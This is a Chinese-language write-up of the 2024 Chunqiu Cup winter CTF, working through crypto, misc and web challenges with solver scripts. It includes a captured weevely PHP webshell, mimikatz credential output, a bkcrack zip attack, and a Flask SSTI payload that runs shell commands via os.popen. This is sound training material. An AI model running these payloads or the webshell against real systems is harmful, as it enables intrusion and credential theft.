# 2024 春秋杯网络安全联赛冬季赛


1.17，1.18，1.19为期三天

<!--more-->

## crypto

### 你是小哈斯?

题目内容：年轻黑客小符参加CTF大赛，他发现这个小哈斯文件的内容存在高度规律性，并且文件名中有隐藏信息，他成功找到了隐藏的信息，并破解了挑战。得意地说：“成功在于探索与质疑，碰撞是发现真相的关键！”

exp：

```bash
import hashlib

def calculate_sha1(input_string):
    """计算字符串的SHA-1哈希值"""
    sha1 = hashlib.sha1()
    sha1.update(input_string.encode('utf-8'))
    return sha1.hexdigest()

def find_matching_characters(hashes):
    """找到与哈希值匹配的Base64字符与其他字符"""
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/={}_,.-"
    results = []
    for hash_value in hashes:
        match_found = False
        for char in base64_chars:
            if calculate_sha1(char) == hash_value:
                results.append(char)
                match_found = True
                break
        if not match_found:
            results.append('No match found')
    return results

def read_hashes_from_file(filename):
    """从文件中读取SHA-1哈希值"""
    with open(filename, 'r') as file:
        hashes = file.readlines()
    return [hash.strip() for hash in hashes]

# 读取SHA-1哈希值文件
hashes = read_hashes_from_file('sha1.txt')

# 查找匹配的Base64字符
results = find_matching_characters(hashes)

# 拼接所有匹配的字符
decrypted_string = ''.join(results)

# 输出解密后的字符串
print(f"Decrypted String: {decrypted_string}")
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117122556-m3bbziz.png?imageSlim)​

### 通往哈希的旅程

题目内容：在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串"ca12fd8250972ec363a16593356abb1f3cf3a16d"，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）

exp

```bash
import hashlib

# 目标哈希值
target_hash = "ca12fd8250972ec363a16593356abb1f3cf3a16d"

# 遍历以188开头的11位号码
for number in range(18800000000, 18899999999 + 1):
    # 将号码转换为字符串
    candidate = str(number)
    # 计算SHA-1哈希值
    sha1_hash = hashlib.sha1(candidate.encode()).hexdigest()
    # 比较哈希值
    if sha1_hash == target_hash:
        print(f"找到匹配的号码: {candidate}")
        break
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123153-cc2wfs1.png?imageSlim)​

## misc

### 简单算术

题目内容：想想异或

赛博厨子XOR Brute Force

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123054-gvwuu1x.png?imageSlim)​

### 简单镜像提取

题目内容：RR\_studio

导出文件

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123449-cz0fez2.png?imageSlim)​

解压后用R-studio加载

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123508-zj6zvdh.png?imageSlim)​

随后恢复销售报表

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123609-88ov6lv.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123625-byzk7bk.png?imageSlim)​

### See anything in these pics?

题目内容：TBH THERE ARE SO MANY PICS NOT ONLY JUST 2 PIC

Aztec 条码扫描

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123814-iynuids.png?imageSlim)​

得到解压密码5FIVE

对得到的jpg文件进行foremost分解得到png

再对png进行宽高修复，得到flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117123953-bxjlh0u.png?imageSlim)​

### 压力大，写个脚本吧

题目内容：爆破

解压之后发现是password_xx.txt中字符串from base64作为密码，解压zip_xx.zip

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117180946-dusbghh.png?imageSlim)​

写个脚本批量解密

```bash
import zipfile
import os
import base64
import re


def read_password_file(password_file):
    # 读取并解码密码文件
    with open(password_file, 'r') as f:
        return base64.b64decode(f.read().strip()).decode()


def extract_zip(zip_path, password):
    # 解压zip文件并返回解压出的zip文件路径（如果存在）
    dir_name = os.path.dirname(zip_path)
    with zipfile.ZipFile(zip_path) as zf:
        zf.extractall(path=dir_name, pwd=password.encode())
        for file in zf.namelist():
            if file.endswith('.zip'):
                return os.path.join(dir_name, file)
    return None


def collect_all_passwords(start_zip):
    # 收集所有解压过程中的密码
    current_zip, passwords, processed = start_zip, [], set()
    while current_zip and os.path.exists(current_zip) and current_zip not in processed:
        processed.add(current_zip)
        # 提取文件名中的数字
        match = re.search(r"(\d+)", os.path.basename(current_zip))
        if not match:
            print(f"文件名中未找到数字: {current_zip}")
            break
        password_file = f'password_{match.group(1)}.txt'
        if not os.path.exists(password_file):
            print(f"密码文件 {password_file} 不存在，停止处理")
            break
        print(f"处理: {current_zip}\n使用密码文件: {password_file}")
        try:
            password = read_password_file(password_file)
            passwords.append(password)
            print(f"解码后的密码: {password[:20]}...")
            current_zip = extract_zip(current_zip, password)
            print(f"发现新的zip文件: {current_zip}" if current_zip else "未找到更多的zip文件，处理完成！")
        except Exception as e:
            print(f"处理出错: {str(e)}")
            break
    return passwords


def create_png_from_passwords(passwords, output_file="flag.png"):
    # 从密码列表创建PNG文件
    cleaned_hex = ''.join(c for p in passwords[::-1] for c in p if c in '0123456789ABCDEFabcdef')
    if '89504E47' not in cleaned_hex.upper():  # 检查PNG文件头
        print("未找到PNG文件头，数据可能不完整")
        return False
    if len(cleaned_hex) % 2 != 0:  # 确保十六进制长度为偶数
        cleaned_hex = cleaned_hex[:-1]
    try:
        with open(output_file, "wb") as f:
            f.write(bytes.fromhex(cleaned_hex))
        print(f"成功创建PNG文件: {output_file}")
        return True
    except Exception as e:
        print(f"创建PNG文件时出错: {str(e)}")
        return False


def main():
    # 主函数，执行完整的处理流程
    start_zip = "zip_98.zip"
    print("步骤1: 开始收集所有密码...")
    passwords = collect_all_passwords(start_zip)
    if not passwords:
        print("未收集到任何密码！")
        return
    print(f"\n步骤2: 共收集到 {len(passwords)} 个密码\n\n步骤3: 开始生成PNG文件...")
    print("\n处理完成！请查看生成的flag.png文件" if create_png_from_passwords(passwords) else "\n生成PNG文件失败！")


if __name__ == "__main__":
    main()
```

最后扫描二维码

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117181958-u4oqatb.png?imageSlim)​

‍

### ez_forensics

扫描时间线，发现有相关文件

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117183255-t515phf.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117183318-d1zbz8m.png?imageSlim)​

但f14g.7z是损坏的，使用R-Studio进行提取

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117183400-o68s0wa.png?imageSlim)​

根据hint.txt

```bash
60 = ( ) + ( )

W@S Q9@S=5 RPW 92Q95S>N 7@P R96 N2QQU@P5 @7 R96 sXa
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117183445-b83syd5.png?imageSlim)​

提取密码

mimikatz模块

```bash
Module   User             Domain           Password                              
-------- ---------------- ---------------- ----------------------------------------
wdigest  Flu0r1n3         Flu0r1n3-PC      strawberries                          
wdigest  FLU0R1N3-PC$     WORKGROUP                                              

```

密码为strawberries，解压得到flag_is_here.ini

查看内容，根据hint可推测为MobaXterm的ini配置文件

提取ini中的root加密密文，使用MobaXtermCipher.py进行解密

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250120153737-on6opud.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250120153545-bjyedeo.png?imageSlim)​

主密钥为flag_is_here（文件名，有点脑洞.....）

随后base64解码得到flag

使用github的解密工具进行解密，得到flag{you_are_a_g00d_guy}

### 音频的秘密

deepsound，密码123

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250119182124-3a32unq.png?imageSlim)​

7z，真压缩，发现加密算法是ZipCrypto Store，可以尝试明文攻击

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250119182243-v2uu7po.png?imageSlim)​

> 但如果是：
>
> AES-256 Deflate
>
> AES-256 Store
>
> 这两种压缩算法，那就没办法明文攻击

我们可以利用只有这个文件头的png文件对该压缩包明文攻击

```bash
echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps > png_header
```

随后

```bash
bkcrack -C flag.zip -c flag.png -p png_header
```

随后得到keys：29d29517 0fa535a9 abc67696

随后

```bash
./bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png -d flag.png
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250119183151-5hzt4rm.png?imageSlim)​

得到png图片

![flag](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/flag-20250119183306-5kw81w3.png?imageSlim)​

随后lsb，可以随波逐流一把梭

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250119183351-6mhd3mh.png?imageSlim)​

stegsolve也可以

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250119183454-ony2ad4.png?imageSlim)​

### Weevil's Whisper

题目内容：Bob found that his computer had been hacked. Fortunately, he was using wireshark to test packet capture before the hack. Would you please analyze the packet and find out what the hacker did

weevely木马流量

追踪http流

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118181426-zta4qvx.png?imageSlim)​

```bash
<?php
$k="161ebd7d";$kh="45089b3446ee";$kf="4e0d86dbcf92";$p="lFDu8RwONqmag5ex";

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o="";
for($i=0;$i<$l;){
for($j=0;($j<$c&&$i<$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print("$p$kh$r$kf");
}


?>
```

根据木马脚本写个解密脚本

```bash
<?php
$k = "161ebd7d";
$kh = "45089b3446ee";
$kf = "4e0d86dbcf92";
$p = "lFDu8RwONqmag5ex";

// 异或加密/解密函数
function x($t, $k) {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0; $i < $l;) {
		for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
			$o .= $t[$i] ^ $k[$j];
		}
	}
	return $o;
}

// 密文
$encrypted_data = "lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92";

// 去掉前缀和标记
if (strpos($encrypted_data, $p) === 0 && strpos($encrypted_data, $kh) !== false && strpos($encrypted_data, $kf) !== false) {
	// 去掉前缀 $p
	$encrypted_data = substr($encrypted_data, strlen($p));
	// 去掉起始标记 $kh 和结束标记 $kf
	$encrypted_data = substr($encrypted_data, strlen($kh), -strlen($kf));
} else {
	die("Invalid encrypted data format.");
}

// Base64 解码
$base64_decoded = base64_decode($encrypted_data);

// 使用密钥 $k 解密
$decrypted_data = x($base64_decoded, $k);

// Gzip 解压缩
$uncompressed_data = gzuncompress($decrypted_data);

// 输出解密后的数据
echo "Decrypted data: " . $uncompressed_data . "\n";
?>
```

解密流25的响应流量得到flag

```bash
lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118181952-ez8b17y.png?imageSlim)​

### find me

题目内容：0x1337年奶龙大军入侵地球，人类命运危在旦夕。就在这紧急时刻，cow与贝利亚大人进行了联络，寻求帮助。伟大的贝利亚给了cow一份文件，而在这文件里藏着拯救地球的秘密，你能否找到它！！！！

在bigbigcowcow目录下发现flag.zip，同时根据icon.png推测应该是mc地图

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118182114-v4a2mjs.png?imageSlim)​

去最近的雪屋看一下

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118182238-c9n260i.png?imageSlim)得到了key：cwqeafvfwqead

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118182257-blykheb.png?imageSlim)​

‍

解压得到

```bash
Who is bigbigcowcow I'am bigbigcowcow hahahahah OK this is Your flag: unai?535.0a20[189.[4049[ax30[e.j60xaj91x8+
```

随波逐流一把梭

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118182421-tmuodxt.png?imageSlim)​

### NetHttP

题目内容：在凌晨一两点，公司内网有一台私人服务器被入侵，攻击者非常挑衅的留下了明显的痕迹。

ssti盲注

处理的有点麻烦，先把pcapng流量转为csv，存入data.txt

随后

solve1.py

```bash
# 打开 data.txt 文件并读取所有行
with open('data.txt', 'r') as file:
    lines = file.readlines()

# 创建一个列表来存储包含 "64" 的数据行的前两行
result_lines = []

# 遍历所有行
for i, line in enumerate(lines):
    if '"66"' in line:  # 检查当前行是否包含 "64"
        # 如果当前行包含 "64"，则将其前两行添加到结果列表中（如果存在）
        if i >= 2:  # 确保有前两行
            result_lines.append(lines[i-2])  # 前第二行

        elif i == 1:  # 如果当前行是第二行，只有前一行
            result_lines.append(lines[i-1])  # 前第一行
        # 将包含 "64" 的行也添加到结果列表中
        result_lines.append(line)

# 将结果写入 result1.txt 文件
with open('result1.txt', 'w') as result_file:
    result_file.writelines(result_lines)

print("数据已成功提取并写入 result1.txt 文件。")
```

随后solve2.py

```bash
# 读取文件并删除包含 "HTTP/1.1 200 OK" 的行
with open('result1.txt', 'r') as file:
    lines = file.readlines()

# 过滤掉包含 "HTTP/1.1 200 OK" 的行
filtered_lines = [line for line in lines if "HTTP/1.1 200 OK" not in line]

# 将过滤后的内容写回文件
with open('result2.txt', 'w') as file:
    file.writelines(filtered_lines)

print("包含 'HTTP/1.1 200 OK' 的行已删除。")
```

随后solve3.py

```bash
import re

# 打开result2.txt文件进行读取
with open('result2.txt', 'r') as file:
    lines = file.readlines()

# 打开result3.txt文件进行写入
with open('result3.txt', 'w') as output_file:
    for line in lines:
        # 使用正则表达式提取"echo"和"|"之间的数据
        match = re.search(r'echo\s+(.*?)\s*\|', line)
        if match:
            # 提取到的数据
            extracted_data = match.group(1)
            # 将提取到的数据写入result3.txt
            output_file.write(extracted_data + '\n')

print("数据提取完成，已写入result3.txt")
```

随后solve4.py

```bash
import re

# 读取文件内容
with open('result4.txt', 'r') as file:
    lines = file.readlines()

# 用于存储位置和字符的字典
char_dict = {}

# 正则表达式提取位置和字符
pattern = r'cut -c (\d+)\) == \'(.?)\''
for line in lines:
    match = re.search(pattern, line)
    if match:
        position = int(match.group(1))  # 提取位置
        char = match.group(2)           # 提取字符
        char_dict[position] = char

# 按位置排序并拼接字符串
sorted_chars = [char_dict[pos] for pos in sorted(char_dict.keys())]
result = ''.join(sorted_chars)

# 输出结果
print("提取的字符串为:", result)


with open('result5.txt', 'w') as output_file:
    output_file.write(result)

print("结果已写入 result5.txt")
```

随后solve5.py

```bash
import re

# 打开 result5.txt 文件进行读取
with open('result5.txt', 'r') as file:
    lines = file.readlines()

# 用于存储位置和字符的字典
char_dict = {}

# 正则表达式提取位置和字符
pattern = r"cut -c (\d+)\).*== '(.*?)'"
for line in lines:
    match = re.search(pattern, line)
    if match:
        position = int(match.group(1))  # 提取位置
        char = match.group(2)           # 提取字符
        char_dict[position] = char

# 按位置排序并拼接字符串
sorted_chars = [char_dict[pos] for pos in sorted(char_dict.keys())]
result = ''.join(sorted_chars)

# 输出结果
print("提取的字符串为:", result)

# 将结果写入 result3.txt
with open('result3.txt', 'w') as output_file:
    output_file.write(result)

print("结果已写入 result6.txt")
```

得到/flag是fake flag

另外`/app/secret/mw/m5`​推测跟流量中的key和rsa密钥有关

```bash
S0I3iWhvszKbOM/OalKTA0fpm5O5chVVnYGyKd5nV4erAzRbV6V6w8b/UiOfQEc3Ijh00hFjYFU1HaxNub9GnlPS/lcam5mATkf2sJS6JgpJo6AShVRxWDYKKrojeUeBZj5MEPI8/4DGGGuHFxmx2bxAahdDe1cGnjTZGWONpNI=
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118183011-lay3z9g.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118183041-6jqs2m6.png?imageSlim)​

将rsa私钥解密

```bash
from cryptography.hazmat.primitives import serialization

def decrypt_private_key(key_path, password):
    # 读取并解密私钥
    with open(key_path, 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=password.encode()
        )

    # 导出未加密的私钥
    decrypted_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # 保存解密后的私钥
    with open('decrypted_key.pem', 'wb') as f:
        f.write(decrypted_pem)

    print("私钥解密完成")

# 使用示例
decrypt_private_key('key.txt', 'gdkfksy05lx0nv8dl')
```

得到解密后的私钥

```bash
-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGAaxYIU7D5lIndIBLu
bRRywJZiAQ90QiRjuHAIsyyka69Wl1n9K4W9/hjNDeI5BP14oADSmOqLKmj8nw2w
bk0mDZ0KbWfT3eCxttGoplMEoCqKizTMdHGe7MUaK9A2CKIHOsHQhkpAmwLcDzNr
bLg9nx0hjPUDefqwCn1q7B/IQPMCAwEAAQKBgEQaQ/ttrpwfvUhbodQvT/dY7ET+
XhJ+cAjo/y9r8bkmTmx853xZVwYVIbt1pouc46zmOQjVCOJU2GwS2aScXdkx8Fm1
YQJqzbxcZ4oEA/f66E99560um3RRsa7DWKwNdIcU4wukyfgx5fILoiuE8ThjG23V
b3oDOzaIhyCrcO65AkEApZJjxmMk0AB8ZUkhIqw+2gD4N5SPisae+aFfLgLt14H4
VwSZxl2kRs7yhZGl5spFlxdotym3YS/30aY3/+3GPQJBAKWSY8ZjJNAAfGVJISKs
PtoA+DeUj4rGnvmhXy4C7deB+FcEmcZdpEbO8oWRpebKRZcXaLcpt2Ev99GmN//t
xu8CQQCf2DInBvQ1MyLlDbLFrJCJGsKHtg7WJWa5DQe8fetsUPeV2sUycpj0Gzqb
pL8Ljl+cvGbF3apCU3LmnZgWplDpAkB+i1EYqmPTWdu5adgacP0kj4Mmr7O5xC5y
6kQdnX18rchJcam5843/1GGFdpkOuF/Rp8GP5CFU9V157Yl1YJ0fAkAvcGpACEWD
gZPSO8jGVr6XoVtA0tW2JMX/nPoxI1soLG38Kwaqc/+bepMmRQ50dlvZUA4uufmT
N3OWrL+BavU0
-----END PRIVATE KEY-----
```

最后解密得到flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118183254-y2yqks6.png?imageSlim)​

### EzMisc

(这道题最终只有1解，参考官方wp)

> 题目内容：某公司网络安全管理员小王截获了一段公司内部向外传输信息的流量，请分析并获取传输的内容
>
> 题目提示：1、利⽤DP泄露来求出私钥，从⽽还原私钥流解密密⽂ 2、图片经过了Arnold变换

分析流量包，发现是FTP传输文件的，共下载了三个文件，分别导出一下

RSA私钥，flag.7z，enc

其中私钥是残缺的，利用DP泄露来求出私钥，从而还原私钥流解密密文

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs+6Ep8SasbhvIG62iRgAqppC7E6xtM3edPdn654H0IIJcr3T
sis8OO5JcElSHhJkCkT1xtRgHm1zVyPIpzZTPZY3vMgN+xTuDwn7roPrMJ9oYhUE
8Yt3lBGotOyZh7/fSq/hd9IATqmO3gTgBzQFFPKK+NLHhidYYEkbg7Mj2TCaSOZO
Ztka7LsPfjnr2bo/h3MvJAx86REDO2FXvJAhY9A/ViBatq0pGKD/LioHkwafjd2r
xQA3Sjnur8LxOWeM9nNZkZR4DH/kkxHLKxslRePGkOHbLgwIO9bdplhI1ky7gQpC
Q3moi74VPd88jnngyAftGqm2h0Mw2jVZgwz6RQIDAQABAoIBAENuo1aAjv0Fwtfj
xhLw5OcK8wO+pki9Up6BTff2fLU+1q2iyKCgJWysmOc1A0pz1/wlRfrjArbEjBJf
Pca0zFNrZa4hR2QOvvzx39nSZKUPSL5hZD3l58WdLJ3JgexnExbZfWU7VZQlZX59
Uzw/2Zu1HjIMRGxZeHx1SZN84nV1aMj/9FFlpC54ZG0mz33BsmphKnQTYLlINzQl
laL6ZR5N+/3QoIGj+TNIHkUQhFCR9d285FWIUWEmhh9UE8UwFPw+gaDcrOcVpSpT
hAapMbzBuZ8AAAAAAAAAKLpJRp1+1TmSOtj/eO4sxKXOMdEH1weFCzBUogIKK0H6
VJt6DG0CgYEA7oQV+b31O418CJ3ehDlSjFy3+KdxEXpDujgwP5dwbCenHDNEfx0Y
+TzknEC+A/azdn+AhOQyQAE4xGwygb8i2OPC3ZqOhv26yGhv5WZxG2qsQVMCZYD0
+FCmf656TA2rwx6yRf5UtVBecIhSoUkEekxO0lbiBAAAAAAAAAsmadcCgYEAwR8P
IEpv47T1jla9RTQuSby4eSu3OvrN/SkKPVFui/aDUG/OO0fQzGuEq2rthtXuGBna
Qjvyd+PZngYLn8vHKqmuxAlNUivq3rvGwpayRL83Pts02+4fOa/p7TJkdLlQDHxo
La7sn/SiuAAAAAAAAAeFlii6mTG+kUZ98n3IEUMCgYEAlyQaLNSjpqYkV+16CL2u
QoWqiqXIL3QToNhkMpfLRK3n5iXSnN4aai2dDCq2fhqBZHCtRwi3kvlzOHz7kF5H
PbsuS3DaKk50YvRTG8HLoLz7BLYOSbXrBcNNjpFIrBLpqc4018evc+nGvnaULeHw
NXNPa1hlCNFXgJ4+ne3f/KcCgYEAu0KerDUBoc8KfGbnSH98ksuIJRaaqXog22Y8
I5EenGEAm7KOSzUr5cwr7PvWLnSqVnxbAvaV+mLZ1T0PcHdsPJYkfLp4W0FykV+L
L4xod/jiXPS5oLiZVpqZPgMrHXPDhxfq/MEteTAAAAAAAAApzN0kj6IWrg1qN/we
jFAi+3kCgYABKVPNcN25ZT/FjL4uLKhyu3Q6vgPRQwP//bPlTloenxDT8RN3znpx
qzv0e84HQH5lH/AxNix5eq/apOi8B0q6IW1Fj3ytczR8cvPhCln/zWV/ZXxj6Rul
JR3mGGh3lYDqiTxi+6ZbKqbhc4N7na8VHx+CoAGMqRUFzAAAAAAAAA==
-----END RSA PRIVATE KEY-----
```

```bash
import gmpy2
from Crypto.Util.number import long_to_bytes
e = 0x10001
n = 0x00b3ee84a7c49ab1b86f206eb6891800aa9a42ec4eb1b4cdde74f767eb9e07d0820972bdd3b22b3c38ee497049521e12640a44f5c6d4601e6d735723c8a736533d9637bcc80dfb14ee0f09fbae83eb309f68621504f18b779411a8b4ec9987bfdf4aafe177d2004ea98ede04e007340514f28af8d2c786275860491b83b323d9309a48e64e66d91aecbb0f7e39ebd9ba3f87732f240c7ce911033b6157bc902163d03f56205ab6ad2918a0ff2e2a0793069f8dddabc500374a39eeafc2f139678cf673599194780c7fe49311cb2b1b2545e3c690e1db2e0c083bd6dda65848d64cbb810a424379a88bbe153ddf3c8e79e0c807ed1aa9b6874330da3559830cfa45
dp = 0x0097241a2cd4a3a6a62457ed7a08bdae4285aa8aa5c82f7413a0d8643297cb44ade7e625d29cde1a6a2d9d0c2ab67e1a816470ad4708b792f973387cfb905e473dbb2e4b70da2a4e7462f4531bc1cba0bcfb04b60e49b5eb05c34d8e9148ac12e9a9ce34d7c7af73e9c6be76942de1f035734f6b586508d157809e3e9deddffca7
 
for x in range(1,e):  #遍历X
    if (dp*e-1)%x==0:
        p=(dp*e-1)//x +1
        if n%p==0:
            q=n//p   #得到q
            phi=(p-1)*(q-1)  #欧拉函数
            d=gmpy2.invert(e,phi)  #求逆元
            print(d)
```

解密得到密文为M1sc_1s_s0_e@sy!

```bash
import gmpy2
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

e = 0x10001
n = 0xb3ee84a7c49ab1b86f206eb6891800aa9a42ec4eb1b4cdde74f767eb9e07d0820972bdd3b22b3c38ee497049521e12640a44f5c6d4601e6d735723c8a736533d9637bcc80dfb14ee0f09fbae83eb309f68621504f18b779411a8b4ec9987bfdf4aafe177d2004ea98ede04e007340514f28af8d2c786275860491b83b323d9309a48e64e66d91aecbb0f7e39ebd9ba3f87732f240c7ce911033b6157bc902163d03f56205ab6ad2918a0ff2e2a0793069f8dddabc500374a39eeafc2f139678cf673599194780c7fe49311cb2b1b2545e3c690e1db2e0c083bd6dda65848d64cbb810a424379a88bbe153ddf3c8e79e0c807ed1aa9b6874330da3559830cfa45
d = 0x436ea356808efd05c2d7e3c612f0e4e70af303bea648bd529e814df7f67cb53ed6ada2c8a0a0256cac98e735034a73d7fc2545fae302b6c48c125f3dc6b4cc536b65ae2147640ebefcf1dfd9d264a50f48be61643de5e7c59d2c9dc981ec671316d97d653b559425657e7d533c3fd99bb51e320c446c59787c7549937ce2757568c8fff45165a42e78646d26cf7dc1b26a612a741360b94837342595a2fa651e4dfbfdd0a081a3f933481e4510845091f5ddbce45588516126861f5413c53014fc3e81a0dcace715a52a538406a931bcc1b99f269282083dc86f28ba49469d7ed539923ad8ff78ee2cc4a5ce31d107d707850b3054a2020a2b41fa549b7a0c6d

# dp泄露攻击， n ,e, d
rsakey = RSA.construct((n, e, d)) # 重构私钥流

# 读取密文流
with open('enc', 'rb') as f:
    enc = f.read()
  
# 私钥流基于OAEP模式进行密钥填充
rsa = PKCS1_OAEP.new(rsakey)
try:
    m = rsa.decrypt(enc) # 调用.decrypt()进行解密
    print(m)  # Assuming the decrypted message is a string
except Exception as ex:
    print("Decryption failed:", ex)
```

根据题目提示为arnold变换，爆破一下shuffle_times, a, b参数

arnold_brute.py

```bash
import matplotlib.pyplot as plt
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    """ decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    """
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape)
    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N
                new_y = ((-a) * ori_x + ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
        image = np.copy(decode_image)
      
    return image

def arnold_brute(image,shuffle_times_range,a_range,b_range):
    for c in range(shuffle_times_range[0],shuffle_times_range[1]):
        for a in range(a_range[0],a_range[1]):
            for b in range(b_range[0],b_range[1]):
                print(f"[+] Trying shuffle_times={c} a={a} b={b}")
                decoded_img = arnold_decode(image,c,a,b)
                output_filename = f"flag_decodedc{c}_a{a}_b{b}.png"
                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
              
if __name__ == "__main__":
    img = cv2.imread("cat.png")
    arnold_brute(img, (1,8), (1,12), (1,12))

```

得到参数shuffle_times, a, b分别为6, 16, 26

arnold变换图像解密

```bash
import os
import cv2
import numpy as np

def de_arnold(img, shuffle_time, a, b):
    r, c, d = img.shape
    dp = np.zeros(img.shape, np.uint8)

    for s in range(shuffle_time):
        for i in range(r):
            for j in range(c):
                x = ((a * b + 1) * i - b * j) % r
                y = (-a * i + j) % c
                dp[x, y, :] = img[i, j, :]
        img = np.copy(dp)
    return img

# 参数设置
a, b = ?,  ? # Arnold变换的参数
max_attempts = ? # 爆破的最大尝试次数
output_dir = "decrypted_images"  # 输出文件夹
os.makedirs(output_dir, exist_ok=True)

# 读取加密图片
img_en = cv2.imread('en_flag.png')
if img_en is None:
    raise FileNotFoundError("加密图片未找到，请检查路径和文件名是否正确。")

# 开始爆破
for shuffle_time in range(1, max_attempts + 1):
    img_decrypted = de_arnold(img_en, shuffle_time, a, b)
    output_path = os.path.join(output_dir, f"flag_{shuffle_time}.png")
    cv2.imwrite(output_path, img_decrypted)
    print(f"解密图片已保存: {output_path}")

print(f"爆破完成，共生成 {max_attempts} 张解密图片，保存在文件夹: {output_dir}")
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250120162040-k7b5gq9.png?imageSlim)​

## web

### easy_flask

题目内容：想想flask！！

payload

```bash
{{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag').read()")}} 
```

发包

```bash
GET /?user=%7b%7b''.__class__.__base__.__subclasses__()%5b80%5d.__init__.__globals__%5b'__builtins__'%5d.eval(%22__import__('os').popen('cat%20flag').read()%22)%7d%7d HTTP/1.1
Host: 123.56.4.173:37054
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://123.56.4.173:37054/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117125615-64zhjeb.png?imageSlim)​

### file_copy

题目内容：file copy

确定flag位置

